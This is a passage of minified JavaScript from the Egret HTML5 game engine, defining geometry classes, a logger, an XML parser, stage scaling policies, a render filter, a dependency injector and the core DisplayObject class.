                c ? (this.array[0] = this.a, this.array[1] = this.b, this.array[2] = 0, this.array[3] = this.c, this.array[4] = this.d, this.array[5] = 0, this.array[6] = this.tx, this.array[7] = this.ty) : (this.array[0] = this.a, this.array[1] = this.b, this.array[2] = this.tx, this.array[3] = this.c, this.array[4] = this.d, this.array[5] = this.ty, this.array[6] = 0, this.array[7] = 0);
                this.array[8] = 1;
                return this.array
            };
        a.identity = new a;
        a.DEG_TO_RAD = Math.PI / 180;
        return a
    }(b.HashObject);
    b.Matrix = e;
    e.prototype.__class__ =
        "egret.Matrix"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a(c, a) {
            void 0 === c && (c = 0);
            void 0 === a && (a = 0);
            b.call(this);
            this.x = c;
            this.y = a
        }

        __extends(a, b);
        a.prototype.clone = function () {
            return new a(this.x, this.y)
        };
        a.prototype.equals = function (c) {
            return this.x == c.x && this.y == c.y
        };
        a.distance = function (c, a) {
            return Math.sqrt((c.x - a.x) * (c.x - a.x) + (c.y - a.y) * (c.y - a.y))
        };
        a.identity = new a(0, 0);
        return a
    }(b.HashObject);
    b.Point = e;
    e.prototype.__class__ = "egret.Point"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a(c, a, l, e) {
            void 0 === c && (c = 0);
            void 0 === a && (a = 0);
            void 0 === l && (l = 0);
            void 0 === e && (e = 0);
            b.call(this);
            this.x = c;
            this.y = a;
            this.width = l;
            this.height = e
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "right", {
            get: function () {
                return this.x + this.width
            }, set: function (c) {
                this.width = c - this.x
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "bottom", {
            get: function () {
                return this.y + this.height
            }, set: function (c) {
                this.height = c - this.y
            }, enumerable: !0, configurable: !0
        });
        a.prototype.initialize = function (c, a, b, d) {
            this.x = c;
            this.y = a;
            this.width = b;
            this.height = d;
            return this
        };
        a.prototype.contains = function (c, a) {
            return this.x <= c && this.x + this.width >= c && this.y <= a && this.y + this.height >= a
        };
        a.prototype.intersects = function (c) {
            var a = c.right, b = c.bottom, d = this.right, e = this.bottom;
            return this.contains(c.x, c.y) || this.contains(c.x, b) || this.contains(a, c.y) || this.contains(a, b) || c.contains(this.x, this.y) || c.contains(this.x, e) || c.contains(d, this.y) || c.contains(d, e) ? !0 : !1
        };
        a.prototype.clone =
            function () {
                return new a(this.x, this.y, this.width, this.height)
            };
        a.prototype.containsPoint = function (c) {
            return this.x < c.x && this.x + this.width > c.x && this.y < c.y && this.y + this.height > c.y ? !0 : !1
        };
        a.identity = new a(0, 0, 0, 0);
        return a
    }(b.HashObject);
    b.Rectangle = e;
    e.prototype.__class__ = "egret.Rectangle"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function d() {
        }

        d.fatal = function (a, c) {
            void 0 === c && (c = null);
            b.Logger.traceToConsole("Fatal", a, c);
            throw Error(b.Logger.getTraceCode("Fatal", a, c));
        };
        d.info = function (a, c) {
            void 0 === c && (c = null);
            b.Logger.traceToConsole("Info", a, c)
        };
        d.warning = function (a, c) {
            void 0 === c && (c = null);
            b.Logger.traceToConsole("Warning", a, c)
        };
        d.traceToConsole = function (a, c, k) {
            console.log(b.Logger.getTraceCode(a, c, k))
        };
        d.getTraceCode = function (a, c, k) {
            return "[" + a + "]" + c + ":" + (null == k ? "" : k)
        };
        return d
    }();
    b.Logger =
        e;
    e.prototype.__class__ = "egret.Logger"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._isSupportDOMParser = this._xmlDict = this._parser = null;
            this._xmlDict = {};
            window.DOMParser ? (this._isSupportDOMParser = !0, this._parser = new DOMParser) : this._isSupportDOMParser = !1
        }

        __extends(a, d);
        a.getInstance = function () {
            a._instance || (a._instance = new a);
            return a._instance
        };
        a.prototype.parserXML = function (c) {
            for (var a = 0; "\n" == c.charAt(a) || "\t" == c.charAt(a) || "\r" == c.charAt(a) || " " == c.charAt(a);)a++;
            0 != a && (c = c.substring(a, c.length));
            this._isSupportDOMParser ?
                a = this._parser.parseFromString(c, "text/xml") : (a = new ActiveXObject("Microsoft.XMLDOM"), a.async = "false", a.loadXML(c));
            null == a && b.Logger.info("xml not found!");
            return a
        };
        a._instance = null;
        return a
    }(b.HashObject);
    b.SAXParser = e;
    e.prototype.__class__ = "egret.SAXParser"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (c) {
        function k() {
            c.call(this);
            this._designHeight = this._designWidth = 0;
            this._scaleY = this._scaleX = 1;
            this._stageHeight = this._stageWidth = this._offSetY = 0
        }

        __extends(k, c);
        k.getInstance = function () {
            null == k.instance && (a.initialize(), k.instance = new k);
            return k.instance
        };
        k.prototype.setDesignSize = function (c, a, k) {
            this._designWidth = c;
            this._designHeight = a;
            k && (b.Logger.warning("\u8be5\u65b9\u6cd5\u76ee\u524d\u4e0d\u5e94\u4f20\u5165 resolutionPolicy \u53c2\u6570\uff0c\u8bf7\u5728 docs/1.0_Final_ReleaseNote\u4e2d\u67e5\u770b\u5982\u4f55\u5347\u7ea7"),
                this._setResolutionPolicy(k))
        };
        k.prototype._setResolutionPolicy = function (c) {
            this._resolutionPolicy = c;
            c.init(this);
            c._apply(this, this._designWidth, this._designHeight)
        };
        k.prototype.getScaleX = function () {
            return this._scaleX
        };
        k.prototype.getScaleY = function () {
            return this._scaleY
        };
        k.prototype.getOffSetY = function () {
            return this._offSetY
        };
        k.canvas_name = "egretCanvas";
        k.canvas_div_name = "gameDiv";
        return k
    }(b.HashObject);
    b.StageDelegate = e;
    e.prototype.__class__ = "egret.StageDelegate";
    var d = function () {
        function c(a,
                   k) {
            this._containerStrategy = a;
            this._contentStrategy = k
        }

        c.prototype.init = function (c) {
            this._containerStrategy.init(c);
            this._contentStrategy.init(c)
        };
        c.prototype._apply = function (c, a, k) {
            this._containerStrategy._apply(c, a, k);
            this._contentStrategy._apply(c, a, k)
        };
        return c
    }();
    b.ResolutionPolicy = d;
    d.prototype.__class__ = "egret.ResolutionPolicy";
    var a = function () {
        function a() {
        }

        a.initialize = function () {
            a.EQUAL_TO_FRAME = new c
        };
        a.prototype.init = function (c) {
        };
        a.prototype._apply = function (c, a, k) {
        };
        a.prototype._setupContainer =
            function () {
                var c = document.body, a;
                c && (a = c.style) && (a.paddingTop = a.paddingTop || "0px", a.paddingRight = a.paddingRight || "0px", a.paddingBottom = a.paddingBottom || "0px", a.paddingLeft = a.paddingLeft || "0px", a.borderTop = a.borderTop || "0px", a.borderRight = a.borderRight || "0px", a.borderBottom = a.borderBottom || "0px", a.borderLeft = a.borderLeft || "0px", a.marginTop = a.marginTop || "0px", a.marginRight = a.marginRight || "0px", a.marginBottom = a.marginBottom || "0px", a.marginLeft = a.marginLeft || "0px")
            };
        return a
    }();
    b.ContainerStrategy = a;
    a.prototype.__class__ = "egret.ContainerStrategy";
    var c = function (c) {
        function a() {
            c.apply(this, arguments)
        }

        __extends(a, c);
        a.prototype._apply = function (c) {
            this._setupContainer()
        };
        return a
    }(a);
    b.EqualToFrame = c;
    c.prototype.__class__ = "egret.EqualToFrame";
    d = function () {
        function c() {
        }

        c.prototype.init = function (c) {
        };
        c.prototype._apply = function (c, a, k) {
        };
        c.prototype.setEgretSize = function (c, a, k, l, d, m) {
            void 0 === m && (m = 0);
            b.StageDelegate.getInstance()._stageWidth = c;
            b.StageDelegate.getInstance()._stageHeight = a;
            c = document.getElementById(e.canvas_div_name);
            c.style.width = k + "px";
            c.style.height = l + "px";
            c.style.top = m + "px"
        };
        c.prototype._getClientWidth = function () {
            return document.documentElement.clientWidth
        };
        c.prototype._getClientHeight = function () {
            return document.documentElement.clientHeight
        };
        return c
    }();
    b.ContentStrategy = d;
    d.prototype.__class__ = "egret.ContentStrategy";
    var k = function (c) {
        function a(k) {
            void 0 === k && (k = 0);
            c.call(this);
            this.minWidth = k
        }

        __extends(a, c);
        a.prototype._apply = function (c, a, k) {
            a = this._getClientWidth();
            var b = this._getClientHeight(), l = b / k,
                d = a / l, e = 1;
            0 != this.minWidth && (e = Math.min(1, d / this.minWidth));
            this.setEgretSize(d / e, k, a, b * e);
            c._scaleX = l * e;
            c._scaleY = l * e
        };
        return a
    }(d);
    b.FixedHeight = k;
    k.prototype.__class__ = "egret.FixedHeight";
    k = function (c) {
        function a(k) {
            void 0 === k && (k = 0);
            c.call(this);
            this.minHeight = k
        }

        __extends(a, c);
        a.prototype._apply = function (c, a, k) {
            k = this._getClientWidth();
            var b = this._getClientHeight(), l = k / a, d = b / l, e = 1;
            0 != this.minHeight && (e = Math.min(1, d / this.minHeight));
            this.setEgretSize(a, d / e, k * e, b, k * (1 - e) / 2);
            c._scaleX = l * e;
            c._scaleY =
                l * e
        };
        return a
    }(d);
    b.FixedWidth = k;
    k.prototype.__class__ = "egret.FixedWidth";
    k = function (c) {
        function a(k, b) {
            c.call(this);
            this.width = k;
            this.height = b
        }

        __extends(a, c);
        a.prototype._apply = function (c, a, k) {
            k = this.width;
            var b = this.height, l = k / a;
            this.setEgretSize(a, b / l, k, b);
            c._scaleX = l;
            c._scaleY = l
        };
        return a
    }(d);
    b.FixedSize = k;
    k.prototype.__class__ = "egret.FixedSize";
    k = function (c) {
        function a() {
            c.call(this)
        }

        __extends(a, c);
        a.prototype._apply = function (c, a, k) {
            this.setEgretSize(a, k, a, k, Math.floor((a - a) / 2));
            c._scaleX = 1;
            c._scaleY = 1
        };
        return a
    }(d);
    b.NoScale = k;
    k.prototype.__class__ = "egret.NoScale";
    k = function (c) {
        function a() {
            c.call(this)
        }

        __extends(a, c);
        a.prototype._apply = function (c, a, k) {
            var b = this._getClientWidth(), l = this._getClientHeight(), d = b, e = l, n = d / a < e / k ? d / a : e / k, d = a * n, e = k * n, b = Math.floor((b - d) / 2);
            c._offSetY = Math.floor((l - e) / 2);
            this.setEgretSize(a, k / 1, 1 * d, e, b, c._offSetY);
            c._scaleX = 1 * n;
            c._scaleY = 1 * n
        };
        return a
    }(d);
    b.ShowAll = k;
    k.prototype.__class__ = "egret.ShowAll";
    d = function (c) {
        function a() {
            c.call(this)
        }

        __extends(a, c);
        a.prototype._apply = function (c, a, k) {
            var b = this._getClientWidth(), l = this._getClientHeight(), b = b / a, l = l / k;
            this.setEgretSize(a, k, a * b, k * l);
            c._scaleX = b;
            c._scaleY = l
        };
        return a
    }(d);
    b.FullScreen = d;
    d.prototype.__class__ = "egret.FullScreen"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._originalData = {};
            this._drawAreaList = []
        }

        __extends(a, d);
        a.getInstance = function () {
            null == a.instance && (a.instance = new a);
            return a.instance
        };
        a.prototype.addDrawArea = function (c) {
            this._drawAreaList.push(c)
        };
        a.prototype.clearDrawArea = function () {
            this._drawAreaList = []
        };
        a.prototype.drawImage = function (c, a, l, d, e, f, h, p, m, q, r) {
            void 0 === r && (r = void 0);
            h = h || 0;
            p = p || 0;
            var t = a._texture_to_render;
            if (null != t && 0 != f && 0 != e && 0 != m && 0 != q)if (a._worldBounds) {
                var s = this._originalData;
                s.sourceX = l;
                s.sourceY = d;
                s.sourceWidth = e;
                s.sourceHeight = f;
                s.destX = h;
                s.destY = p;
                s.destWidth = m;
                s.destHeight = q;
                for (var u = this.getDrawAreaList(), y = 0; y < u.length; y++) {
                    var v = u[y];
                    if (!this.ignoreRender(a, v, s.destX, s.destY)) {
                        if (0 != this._drawAreaList.length)if (0 != a._worldTransform.b || 0 != a._worldTransform.c) {
                            if (a._worldBounds.x + s.destX < v.x || a._worldBounds.y + s.destY < v.y || a._worldBounds.x + a._worldBounds.width + s.destX > v.x + v.width || a._worldBounds.y + a._worldBounds.height + s.destY > v.y + v.height) {
                                b.Logger.fatal("\u8bf7\u4e0d\u8981\u8ba9\u5e26\u6709\u65cb\u8f6c\u548c\u659c\u5207\u7684\u663e\u793a\u5bf9\u8c61\u8de8\u8fc7\u91cd\u7ed8\u533a\u57df");
                                break
                            }
                        } else {
                            var z = a._worldTransform.a, x = a._worldTransform.d, w;
                            a._worldBounds.x + s.destX < v.x && (w = (v.x - a._worldBounds.x) / z - s.destX, l += w / (m / e), e -= w / (m / e), m -= w, h += w);
                            a._worldBounds.y + s.destY < v.y && (w = (v.y - a._worldBounds.y) / x - s.destY, d += w / (q / f), f -= w / (q / f), q -= w, p += w);
                            a._worldBounds.x + a._worldBounds.width + s.destX > v.x + v.width && (w = (a._worldBounds.x + a._worldBounds.width - v.x - v.width) / z + s.destX, e -= w / (m / e), m -= w);
                            a._worldBounds.y + a._worldBounds.height + s.destY > v.y + v.height && (w = (a._worldBounds.y + a._worldBounds.height -
                            v.y - v.height) / x + s.destY, f -= w / (q / f), q -= w)
                        }
                        c.drawImage(t, l, d, e, f, h, p, m, q, r)
                    }
                }
            } else c.drawImage(t, l, d, e, f, h, p, m, q, r)
        };
        a.prototype.ignoreRender = function (c, a, b, d) {
            var e = c._worldBounds;
            b *= c._worldTransform.a;
            d *= c._worldTransform.d;
            return e.x + e.width + b <= a.x || e.x + b >= a.x + a.width || e.y + e.height + d <= a.y || e.y + d >= a.y + a.height ? !0 : !1
        };
        a.prototype.getDrawAreaList = function () {
            var c;
            0 == this._drawAreaList.length ? (this._defaultDrawAreaList || (this._defaultDrawAreaList = [new b.Rectangle(0, 0, b.MainContext.instance.stage.stageWidth,
                b.MainContext.instance.stage.stageHeight)]), c = this._defaultDrawAreaList) : c = this._drawAreaList;
            return c
        };
        return a
    }(b.HashObject);
    b.RenderFilter = e;
    e.prototype.__class__ = "egret.RenderFilter"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function d() {
        }

        d.mapClass = function (a, c, k) {
            void 0 === k && (k = "");
            a = this.getKey(a) + "#" + k;
            this.mapClassDic[a] = c
        };
        d.getKey = function (a) {
            return "string" == typeof a ? a : b.getQualifiedClassName(a)
        };
        d.mapValue = function (a, c, k) {
            void 0 === k && (k = "");
            a = this.getKey(a) + "#" + k;
            this.mapValueDic[a] = c
        };
        d.hasMapRule = function (a, c) {
            void 0 === c && (c = "");
            var k = this.getKey(a) + "#" + c;
            return this.mapValueDic[k] || this.mapClassDic[k] ? !0 : !1
        };
        d.getInstance = function (a, c) {
            void 0 === c && (c = "");
            var k = this.getKey(a) + "#" +
                c;
            if (this.mapValueDic[k])return this.mapValueDic[k];
            var b = this.mapClassDic[k];
            if (b)return b = new b, this.mapValueDic[k] = b, delete this.mapClassDic[k], b;
            throw Error("\u8c03\u7528\u4e86\u672a\u914d\u7f6e\u7684\u6ce8\u5165\u89c4\u5219:" + k + "\u3002 \u8bf7\u5148\u5728\u9879\u76ee\u521d\u59cb\u5316\u91cc\u914d\u7f6e\u6307\u5b9a\u7684\u6ce8\u5165\u89c4\u5219\uff0c\u518d\u8c03\u7528\u5bf9\u5e94\u5355\u4f8b\u3002");
        };
        d.mapClassDic = {};
        d.mapValueDic = {};
        return d
    }();
    b.Injector = e;
    e.prototype.__class__ = "egret.Injector"
})(egret ||
(egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.NORMAL = "normal";
        b.ADD = "add";
        return b
    }();
    b.BlendMode = e;
    e.prototype.__class__ = "egret.BlendMode"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this.__hack_local_matrix = null;
            this._sizeDirty = this._normalDirty = !0;
            this._parent = this._texture_to_render = null;
            this._y = this._x = 0;
            this._scaleY = this._scaleX = 1;
            this._anchorY = this._anchorX = this._anchorOffsetY = this._anchorOffsetX = 0;
            this._visible = !0;
            this._rotation = 0;
            this._alpha = 1;
            this._skewY = this._skewX = 0;
            this._touchEnabled = !1;
            this._scrollRect = this.blendMode = null;
            this._hasHeightSet = this._hasWidthSet = !1;
            this._worldBounds = this.mask = null;
            this.worldAlpha =
                1;
            this._rectH = this._rectW = 0;
            this._stage = null;
            this._cacheDirty = this._cacheAsBitmap = !1;
            this._colorTransform = null;
            this._worldTransform = new b.Matrix;
            this._cacheBounds = new b.Rectangle(0, 0, 0, 0)
        }

        __extends(a, d);
        a.prototype._setDirty = function () {
            this._normalDirty = !0
        };
        a.prototype.getDirty = function () {
            return this._normalDirty || this._sizeDirty
        };
        a.prototype._setParentSizeDirty = function () {
            var c = this._parent;
            !c || c._hasWidthSet || c._hasHeightSet || c._setSizeDirty()
        };
        a.prototype._setSizeDirty = function () {
            this._sizeDirty ||
            (this._sizeDirty = !0, this._setDirty(), this._setParentSizeDirty())
        };
        a.prototype._clearDirty = function () {
            this._normalDirty = !1
        };
        a.prototype._clearSizeDirty = function () {
            this._sizeDirty = !1
        };
        Object.defineProperty(a.prototype, "parent", {
            get: function () {
                return this._parent
            }, enumerable: !0, configurable: !0
        });
        a.prototype._parentChanged = function (c) {
            this._parent = c
        };
        Object.defineProperty(a.prototype, "x", {
            get: function () {
                return this._x
            }, set: function (c) {
                this._setX(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setX = function (c) {
            b.NumberUtils.isNumber(c) &&
            this._x != c && (this._x = c, this._setDirty(), this._setParentSizeDirty())
        };
        Object.defineProperty(a.prototype, "y", {
            get: function () {
                return this._y
            }, set: function (c) {
                this._setY(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setY = function (c) {
            b.NumberUtils.isNumber(c) && this._y != c && (this._y = c, this._setDirty(), this._setParentSizeDirty())
        };
        Object.defineProperty(a.prototype, "scaleX", {
            get: function () {
                return this._scaleX
            }, set: function (c) {
                b.NumberUtils.isNumber(c) && this._scaleX != c && (this._scaleX = c, this._setDirty(),
                    this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "scaleY", {
            get: function () {
                return this._scaleY
            }, set: function (c) {
                b.NumberUtils.isNumber(c) && this._scaleY != c && (this._scaleY = c, this._setDirty(), this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "anchorOffsetX", {
            get: function () {
                return this._anchorOffsetX
            }, set: function (c) {
                b.NumberUtils.isNumber(c) && this._anchorOffsetX != c && (this._anchorOffsetX = c, this._setDirty(), this._setParentSizeDirty())
            },
            enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "anchorOffsetY", {
            get: function () {
                return this._anchorOffsetY
            }, set: function (c) {
                b.NumberUtils.isNumber(c) && this._anchorOffsetY != c && (this._anchorOffsetY = c, this._setDirty(), this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "anchorX", {
            get: function () {
                return this._anchorX
            }, set: function (c) {
                b.NumberUtils.isNumber(c) && this._anchorX != c && (this._anchorX = c, this._setDirty(), this._setParentSizeDirty())
            }, enumerable: !0,
            configurable: !0
        });
        Object.defineProperty(a.prototype, "anchorY", {
            get: function () {
                return this._anchorY
            }, set: function (c) {
                b.NumberUtils.isNumber(c) && this._anchorY != c && (this._anchorY = c, this._setDirty(), this._setParentSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "visible", {
            get: function () {
                return this._visible
            }, set: function (c) {
                this._setVisible(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setVisible = function (c) {
            this._visible != c && (this._visible = c, this._setSizeDirty())
        };
        Object.defineProperty(a.prototype, "rotation", {
            get: function () {
                return this._rotation
            }, set: function (c) {
                b.NumberUtils.isNumber(c) && this._rotation != c && (this._rotation = c, this._setSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "alpha", {
            get: function () {
                return this._alpha
            }, set: function (c) {
                b.NumberUtils.isNumber(c) && this._alpha != c && (this._alpha = c, this._setDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "skewX", {
            get: function () {
                return this._skewX
            }, set: function (c) {
                b.NumberUtils.isNumber(c) &&
                this._skewX != c && (this._skewX = c, this._setSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "skewY", {
            get: function () {
                return this._skewY
            }, set: function (c) {
                b.NumberUtils.isNumber(c) && this._skewY != c && (this._skewY = c, this._setSizeDirty())
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "touchEnabled", {
            get: function () {
                return this._touchEnabled
            }, set: function (c) {
                this._setTouchEnabled(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setTouchEnabled = function (c) {
            this._touchEnabled =
                c
        };
        Object.defineProperty(a.prototype, "scrollRect", {
            get: function () {
                return this._scrollRect
            }, set: function (c) {
                this._scrollRect = c;
                this._setSizeDirty()
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "measuredWidth", {
            get: function () {
                return this._measureBounds().width
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "measuredHeight", {
            get: function () {
                return this._measureBounds().height
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "explicitWidth", {
            get: function () {
                return this._explicitWidth
            },
            enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "explicitHeight", {
            get: function () {
                return this._explicitHeight
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "width", {
            get: function () {
                return this._getSize(b.Rectangle.identity).width
            }, set: function (c) {
                this._setWidth(c)
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "height", {
            get: function () {
                return this._getSize(b.Rectangle.identity).height
            }, set: function (c) {
                this._setHeight(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setWidth = function (c) {
            this._setSizeDirty();
            this._setCacheDirty();
            this._explicitWidth = c;
            this._hasWidthSet = b.NumberUtils.isNumber(c)
        };
        a.prototype._setHeight = function (c) {
            this._setSizeDirty();
            this._setCacheDirty();
            this._explicitHeight = c;
            this._hasHeightSet = b.NumberUtils.isNumber(c)
        };
        a.prototype._draw = function (c) {
            if (this._visible && !this.drawCacheTexture(c)) {
                this._colorTransform && c.setGlobalColorTransform(this._colorTransform.matrix);
                c.setAlpha(this.worldAlpha, this.blendMode);
                c.setTransform(this._worldTransform);
                var a = this.mask || this._scrollRect;
                a && c.pushMask(a);
                this._render(c);
                a && c.popMask();
                this._colorTransform && c.setGlobalColorTransform(null)
            }
            this.destroyCacheBounds()
        };
        a.prototype.drawCacheTexture = function (c) {
            if (this._cacheAsBitmap) {
                if (this._cacheDirty || this.width != this.renderTexture._sourceWidth || this.height != this.renderTexture._sourceHeight)this._makeBitmapCache(), this._cacheDirty = !1;
                var a = this._texture_to_render, l = a._offsetX, d = a._offsetY, e = a._textureWidth, a = a._textureHeight;
                this._updateTransform();
                c.setAlpha(this.worldAlpha, this.blendMode);
                c.setTransform(this._worldTransform);
                var f = b.MainContext.instance.rendererContext.texture_scale_factor;
                b.RenderFilter.getInstance().drawImage(c, this, 0, 0, e * f, a * f, l, d, e, a);
                return !0
            }
            return !1
        };
        a.prototype._updateTransform = function () {
            this._calculateWorldTransform()
        };
        a.prototype._calculateWorldTransform = function () {
            var c = this._worldTransform, a = this._parent;
            c.identityMatrix(a._worldTransform);
            this._getMatrix(c);
            var b = this._scrollRect;
            b && c.append(1, 0, 0, 1, -b.x, -b.y);
            this.worldAlpha = a.worldAlpha * this._alpha
        };
        a.prototype._render = function (c) {
        };
        a.prototype.getBounds = function (c, a) {
            void 0 === a && (a = !0);
            var l = this._measureBounds(), d = this._hasWidthSet ? this._explicitWidth : l.width, e = this._hasHeightSet ? this._explicitHeight : l.height;
            this._rectW = l.width;
            this._rectH = l.height;
            this._clearSizeDirty();
            var f = l.x, l = l.y, h = 0, p = 0;
            a && (0 != this._anchorX || 0 != this._anchorY ? (h = d * this._anchorX, p = e * this._anchorY) : (h = this._anchorOffsetX, p = this._anchorOffsetY));
            this._cacheBounds.initialize(f -
            h, l - p, d, e);
            d = this._cacheBounds;
            c || (c = new b.Rectangle);
            return c.initialize(d.x, d.y, d.width, d.height)
        };
        a.prototype.destroyCacheBounds = function () {
            this._cacheBounds.x = 0;
            this._cacheBounds.y = 0;
            this._cacheBounds.width = 0;
            this._cacheBounds.height = 0
        };
        a.prototype._getConcatenatedMatrix = function () {
            for (var c = a.identityMatrixForGetConcatenated.identity(), k = this; null != k;) {
                if (0 != k._anchorX || 0 != k._anchorY) {
                    var l = k._getSize(b.Rectangle.identity);
                    c.prependTransform(k._x, k._y, k._scaleX, k._scaleY, k._rotation, k._skewX,
                        k._skewY, l.width * k._anchorX, l.height * k._anchorY)
                } else c.prependTransform(k._x, k._y, k._scaleX, k._scaleY, k._rotation, k._skewX, k._skewY, k._anchorOffsetX, k._anchorOffsetY);
                k = k._parent
            }
            return c
        };
        a.prototype.localToGlobal = function (c, a, l) {
            void 0 === c && (c = 0);
            void 0 === a && (a = 0);
            var d = this._getConcatenatedMatrix();
            d.append(1, 0, 0, 1, c, a);
            l || (l = new b.Point);
            l.x = d.tx;
            l.y = d.ty;
            return l
        };
        a.prototype.globalToLocal = function (c, a, l) {
            void 0 === c && (c = 0);
            void 0 === a && (a = 0);
            var d = this._getConcatenatedMatrix();
            d.invert();
            d.append(1,
                0, 0, 1, c, a);
            l || (l = new b.Point);
            l.x = d.tx;
            l.y = d.ty;
            return l
        };
        a.prototype.hitTest = function (c, a, l) {
            void 0 === l && (l = !1);
            if (!this._visible || !l && !this._touchEnabled)return null;
            l = this._getSize(b.Rectangle.identity);
            return 0 <= c && c < l.width && 0 <= a && a < l.height ? this.mask || this._scrollRect ? this._scrollRect && c > this._scrollRect.x && a > this._scrollRect.y && c < this._scrollRect.x + this._scrollRect.width && a < this._scrollRect.y + this._scrollRect.height || this.mask && this.mask.x <= c && c < this.mask.x + this.mask.width && this.mask.y <= a &&
            a < this.mask.y + this.mask.height ? this : null : this : null
        };
        a.prototype.hitTestPoint = function (c, a, l) {
            c = this.globalToLocal(c, a);
            return l ? (this._hitTestPointTexture || (this._hitTestPointTexture = new b.RenderTexture), l = this._hitTestPointTexture, l.drawToTexture(this), 0 != l.getPixel32(c.x - this._hitTestPointTexture._offsetX, c.y - this._hitTestPointTexture._offsetY)[3] ? !0 : !1) : !!this.hitTest(c.x, c.y, !0)
        };
        a.prototype._getMatrix = function (c) {
            c || (c = b.Matrix.identity.identity());
            var a, l;
            l = this._getOffsetPoint();
            a = l.x;
            l = l.y;
            var d = this.__hack_local_matrix;
            d ? (c.append(d.a, d.b, d.c, d.d, d.tx, d.ty), c.append(1, 0, 0, 1, -a, -l)) : c.appendTransform(this._x, this._y, this._scaleX, this._scaleY, this._rotation, this._skewX, this._skewY, a, l);
            return c
        };
        a.prototype._getSize = function (c) {
            return this._hasHeightSet && this._hasWidthSet ? c.initialize(0, 0, this._explicitWidth, this._explicitHeight) : this._measureSize(c)
        };
        a.prototype._measureSize = function (c) {
            this._sizeDirty ? (c = this._measureBounds(), this._rectW = c.width, this._rectH = c.height, this._clearSizeDirty()) :
                (c.width = this._rectW, c.height = this._rectH);
            c.x = 0;
            c.y = 0;
            return c
        };
        a.prototype._measureBounds = function () {
            return b.Rectangle.identity.initialize(0, 0, 0, 0)
        };
        a.prototype._getOffsetPoint = function () {
            var c = this._anchorOffsetX, a = this._anchorOffsetY;
            if (0 != this._anchorX || 0 != this._anchorY)a = this._getSize(b.Rectangle.identity), c = this._anchorX * a.width, a = this._anchorY * a.height;
            var l = b.Point.identity;
            l.x = c;
            l.y = a;
            return l
        };
        a.prototype._onAddToStage = function () {
            this._stage = b.MainContext.instance.stage;
            b.DisplayObjectContainer.__EVENT__ADD_TO_STAGE_LIST.push(this)
        };
        a.prototype._onRemoveFromStage = function () {
            b.DisplayObjectContainer.__EVENT__REMOVE_FROM_STAGE_LIST.push(this)
        };
        Object.defineProperty(a.prototype, "stage", {
            get: function () {
                return this._stage
            }, enumerable: !0, configurable: !0
        });
        a.prototype.addEventListener = function (c, k, l, e, g) {
            void 0 === e && (e = !1);
            void 0 === g && (g = 0);
            d.prototype.addEventListener.call(this, c, k, l, e, g);
            ((e = c == b.Event.ENTER_FRAME) || c == b.Event.RENDER) && this._insertEventBin(e ? a._enterFrameCallBackList : a._renderCallBackList, k, l, g, this)
        };
        a.prototype.removeEventListener =
            function (c, k, l, e) {
                void 0 === e && (e = !1);
                d.prototype.removeEventListener.call(this, c, k, l, e);
                ((e = c == b.Event.ENTER_FRAME) || c == b.Event.RENDER) && this._removeEventBin(e ? a._enterFrameCallBackList : a._renderCallBackList, k, l, this)
            };
        a.prototype.dispatchEvent = function (c) {
            if (!c._bubbles)return d.prototype.dispatchEvent.call(this, c);
            for (var a = [], b = this; b;)a.push(b), b = b._parent;
            c._reset();
